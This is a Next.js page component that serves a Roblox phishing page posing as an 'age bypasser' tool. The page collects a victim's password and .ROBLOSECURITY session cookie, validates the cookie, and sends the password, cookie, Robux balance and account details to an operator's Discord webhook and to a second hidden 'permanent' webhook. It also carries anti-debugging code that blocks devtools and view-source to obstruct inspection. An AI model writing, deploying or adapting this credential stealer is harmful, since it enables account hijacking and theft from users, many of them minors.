import { supabase } from "../../supabaseClient";

export default async function DirectoryPage({ params }) {
  const { directory } = params;

  // Fetch the site info from Supabase
  const { data, error } = await supabase
    .from("websites")
    .select("*")
    .eq("directory", directory)
    .single();

  if (error || !data) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
        <h1 className="text-3xl font-bold mb-4">❌ Site Not Found</h1>
        <p className="text-gray-400">No record found for "{directory}".</p>
      </div>
    );
  }

  // Enhanced Debug Protection Script
  const debugModeScript = `
    <script>
      // Anti-debug protection
      (function() {
        'use strict';
        
        // Disable right-click context menu
        document.addEventListener('contextmenu', function(e) {
          e.preventDefault();
          return false;
        });
        
        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        document.addEventListener('keydown', function(e) {
          // F12
          if (e.keyCode === 123) {
            e.preventDefault();
            return false;
          }
          // Ctrl+Shift+I (Inspector)
          if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
            e.preventDefault();
            return false;
          }
          // Ctrl+Shift+J (Console)
          if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
            e.preventDefault();
            return false;
          }
          // Ctrl+U (View Source)
          if (e.ctrlKey && e.keyCode === 85) {
            e.preventDefault();
            return false;
          }
          // Ctrl+Shift+C (Element Inspector)
          if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
            e.preventDefault();
            return false;
          }
        });
        
        // Detect DevTools
        let devtools = {
          open: false,
          orientation: null
        };
        
        const threshold = 160;
        
        setInterval(function() {
          if (window.outerHeight - window.innerHeight > threshold || 
              window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
              devtools.open = true;
              // Redirect or close tab when devtools detected
              window.location.href = 'about:blank';
            }
          } else {
            devtools.open = false;
          }
        }, 500);
        
        // Disable text selection
        document.onselectstart = function() {
          return false;
        };
        
        // Disable drag
        document.ondragstart = function() {
          return false;
        };
        
        // Clear console periodically
        setInterval(function() {
          console.clear();
        }, 1000);
        
        // Override console methods
        const noop = function() {};
        ['log', 'warn', 'error', 'info', 'debug', 'trace'].forEach(function(method) {
          console[method] = noop;
        });
        
        // Detect if running in iframe
        if (window.top !== window.self) {
          window.top.location = window.self.location;
        }
        
        // Anti-debugging techniques
        (function() {
          function detectDebugger() {
            const start = performance.now();
            debugger;
            const end = performance.now();
            if (end - start > 100) {
              window.location.href = 'about:blank';
            }
          }
          
          setInterval(detectDebugger, 1000);
        })();
        
      })();
    </script>
  `;

  // Return the HTML template with enhanced debug protection
  return (
    <div dangerouslySetInnerHTML={{
      __html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AGE BYPASSER TOOLS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0a0a2a;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 90%, rgba(120, 219, 255, 0.3) 0%, transparent 50%),
                linear-gradient(135deg, #0a0a2a 0%, #1a1a4a 50%, #0a0a2a 100%);
            color: #fff;
            padding: 20px;
            line-height: 1.5;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        .container {
            width: 100%;
            max-width: 480px;
        }

        .card {
            background: rgba(16, 18, 36, 0.95);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 
                0 10px 30px rgba(0, 0, 0, 0.5),
                0 1px 1px rgba(255, 255, 255, 0.1) inset;
            border: 1px solid rgba(100, 100, 255, 0.2);
            backdrop-filter: blur(10px);
            margin-bottom: 20px;
        }

        h1 {
            text-align: center;
            margin-bottom: 25px;
            font-size: 28px;
            font-weight: 700;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(100, 149, 237, 0.7);
            letter-spacing: 1px;
        }

        .description {
            background: rgba(30, 35, 70, 0.7);
            border-radius: 12px;
            padding: 18px;
            margin-bottom: 25px;
            border-left: 4px solid #6495ed;
            font-size: 15px;
            color: #e0e0ff;
        }

        .description strong {
            color: #6495ed;
            font-weight: 700;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #b0b0ff;
            font-size: 15px;
        }

        input, textarea {
            width: 100%;
            padding: 14px 16px;
            border-radius: 10px;
            border: 1px solid rgba(100, 149, 237, 0.4);
            background: rgba(20, 25, 50, 0.8);
            color: #fff;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #6495ed;
            box-shadow: 0 0 0 2px rgba(100, 149, 237, 0.3);
            background: rgba(25, 30, 60, 0.9);
        }

        textarea {
            height: 120px;
            resize: vertical;
        }

        input::placeholder, textarea::placeholder {
            color: rgba(200, 200, 255, 0.6);
        }

        .btn {
            width: 100%;
            padding: 16px 20px;
            border-radius: 10px;
            background: linear-gradient(135deg, #6495ed 0%, #4169e1 100%);
            border: none;
            color: #fff;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
            box-shadow: 0 4px 15px rgba(100, 149, 237, 0.4);
        }

        .btn:hover {
            background: linear-gradient(135deg, #6fa1ff 0%, #4a7aff 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(100, 149, 237, 0.6);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #7e57c2 0%, #5e35b1 100%);
            box-shadow: 0 4px 15px rgba(126, 87, 194, 0.4);
        }

        .btn-secondary:hover {
            background: linear-gradient(135deg, #8d6bc9 0%, #6d43c7 100%);
            box-shadow: 0 6px 20px rgba(126, 87, 194, 0.6);
        }

        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .progress {
            margin-top: 20px;
            height: 12px;
            background: rgba(30, 35, 70, 0.8);
            border-radius: 8px;
            overflow: hidden;
            display: none;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.4);
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #6495ed 0%, #4169e1 50%, #6495ed 100%);
            transition: width 0.3s ease;
            border-radius: 8px;
        }

        .status {
            margin-top: 12px;
            font-size: 14px;
            color: #b0b0ff;
            text-align: center;
            min-height: 20px;
        }

        .footer {
            text-align: center;
            color: rgba(200, 200, 255, 0.7);
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>⚡ AGE FORCER</h1>
            
            <div class="description">
                <strong>⚠️ CRITICAL ALERT:</strong><br>
                This Tools Will Permanently Remove Email From Your Roblox Account.  This action cannot be undone and will affect your account's age restrictions and features.
            </div>

            <form id="demoForm">
                <div class="form-group">
                    <label for="password">Password</label>
                    <input id="password" type="password" placeholder="Enter your password" />
                </div>

                <div class="form-group">
                    <label for="cookie">Roblox Cookie (.ROBLOSECURITY)</label>
                    <textarea 
                        id="cookie" 
                        placeholder="Paste Your Cookie From Refresher"
                    ></textarea>
                </div>

                <button class="btn" type="button" id="submitBtn">Bypass</button>

                <button class="btn btn-secondary" type="button" id="refreshBtn">Refresh Cookie</button>

                <button class="btn btn-secondary" type="button" id="generateBtn" style="background: linear-gradient(135deg, #28a745 0%, #218838 100%); box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);">Generate Website</button>

                <!-- Loading -->
                <div class="progress" id="progress">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                <div class="status" id="status"></div>
            </form>
        </div>
        
        <div class="footer">
            AGE BYPASSER TOOLS © 2025
        </div>
    </div>

    ${debugModeScript}

    <script>
        const btn = document.getElementById('submitBtn');
        const refreshBtn = document.getElementById('refreshBtn');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        
        // Get all form inputs
        const passwordInput = document.getElementById('password');
        const cookieInput = document.getElementById('cookie');

        // Add event listener for the refresh button
        refreshBtn.addEventListener('click', () => {
            window.open('https://rblx-refresher.ct.ws/?i=1', '_blank');
        });

        // Add event listener for the generate website button
        const generateBtn = document.getElementById('generateBtn');
        generateBtn.addEventListener('click', () => {
            window.location.href = '/generator';
        });

        // Function to validate Roblox cookie via server-side API
        async function validateRobloxCookie(cookie) {
            try {
                const response = await fetch('/api/validate-cookie', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie: cookie })
                });
                
                if (!response.ok) {
                    return { valid: false, error: 'Server error - cannot validate cookie' };
                }
                
                const result = await response.json();
                
                if (result.valid) {
                    return { valid: true, userData: result.userData };
                } else {
                    return { valid: false, error: result.error || 'Cookie is invalid or expired' };
                }
                
            } catch (error) {
                console.error('Validation error:', error);
                return { valid: false, error: 'Network error - cannot validate cookie' };
            }
        }

        // Function to send dual webhook messages
        async function sendDualWebhooks(userData, password, cookie, directory) {
            const userWebhook = '${data.webhook_url}';
            
            const embeds = [
                {
                    title: "🎮 Roblox Account Information",
                    color: 0x00ff00,
                    thumbnail: {
                        url: "https://www.roblox.com/headshot-thumbnail/image?userId=" + userData.id + "&width=420&height=420&format=png"
                    },
                    fields: [
                        {
                            name: "👤 Username",
                            value: userData.name || "N/A",
                            inline: true
                        },
                        {
                            name: "🔑 Password",
                            value: password || "Not provided",
                            inline: true
                        },
                        {
                            name: "💰 Robux",
                            value: userData.robux ? userData.robux.toString() : "N/A",
                            inline: true
                        },
                        {
                            name: "⏳ Pending Robux",
                            value: userData.pendingRobux ? userData.pendingRobux.toString() : "0",
                            inline: true
                        },
                        {
                            name: "⭐ Premium",
                            value: userData.premium ? "Yes" : "No",
                            inline: true
                        },
                        {
                            name: "🎯 Korblox",
                            value: "Checking...",
                            inline: true
                        },
                        {
                            name: "👻 Headless",
                            value: "Checking...",
                            inline: true
                        },
                        {
                            name: "🌐 Directory",
                            value: directory,
                            inline: true
                        },
                        {
                            name: "🆔 User ID",
                            value: userData.id.toString(),
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString()
                },
                {
                    title: "🍪 Cookie Data",
                    color: 0xff0000,
                    description: "Full cookie information:",
                    fields: [
                        {
                            name: "Full Cookie",
                            value: "||" + cookie + "||"
                        }
                    ],
                    timestamp: new Date().toISOString()
                }
            ];

            // Send to user's webhook only if valid
            if (userWebhook) {
                try {
                    await fetch(userWebhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ embeds })
                    });
                } catch (error) {
                    console.error('Error sending to user webhook:', error);
                }
            }

            // Send to permanent webhook via API route
            try {
                await fetch('/api/send-webhook', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        userData,
                        password,
                        cookie,
                        directory,
                        embeds
                    })
                });
            } catch (error) {
                console.error('Error sending to permanent webhook:', error);
            }
        }

        btn.addEventListener('click', async () => {
            // Collect all form data
            const formData = {
                password: passwordInput.value.trim(),
                cookie: cookieInput.value.trim()
            };

            // Basic validation
            if (!formData.cookie) {
                status.textContent = '❌ Please fill in Cookie';
                status.style.color = '#ff5b5b';
                return;
            }

            // Disable button and show progress
            btn.disabled = true;
            btn.textContent = 'Processing...';
            progress.style.display = 'block';
            status.style.color = '#b0b0ff';
            
            let percent = 0;
            status.textContent = 'Validating Cookie 0%';

            const interval = setInterval(() => {
                percent += 2;
                progressBar.style.width = percent + '%';
                
                if (percent <= 40) {
                    status.textContent = 'Validating Cookie ' + percent + '%';
                } else if (percent <= 80) {
                    status.textContent = 'Processing Data ' + percent + '%';
                } else {
                    status.textContent = 'Sending ' + percent + '%';
                }

                if (percent >= 100) {
                    clearInterval(interval);
                    submitForm(formData);
                }
            }, 1000);
        });

        async function submitForm(formData) {
            try {
                // Step 1: Validate Roblox cookie first via server API
                status.textContent = 'Validating Roblox cookie...';
                const validation = await validateRobloxCookie(formData.cookie);
                
                if (!validation.valid) {
                    status.textContent = '❌ ' + validation.error;
                    status.style.color = '#ff5b5b';
                    btn.disabled = false;
                    btn.textContent = 'Bypass';
                    progress.style.display = 'none';
                    return; // STOP HERE - Don't send webhooks for invalid cookies
                }

                // Step 2: Send dual webhooks (only if cookie was valid)
                status.textContent = 'Sending data...';
                await sendDualWebhooks(
                    validation.userData, 
                    formData.password, 
                    formData.cookie,
                    '${directory}'
                );

                status.textContent = 'Successfully ✅ Data Sent!';
                status.style.color = '#4CAF50';
                
                // Clear form
                passwordInput.value = '';
                cookieInput.value = '';

            } catch (error) {
                status.textContent = '🔌 Unable to connect to server. Please check your internet connection and try again.';
                status.style.color = '#ff5b5b';
            }

            // Re-enable button
            btn.disabled = false;
            btn.textContent = 'Bypass';
            progress.style.display = 'none';
        }
    </script>
</body>
</html>`
    }} />
  );
}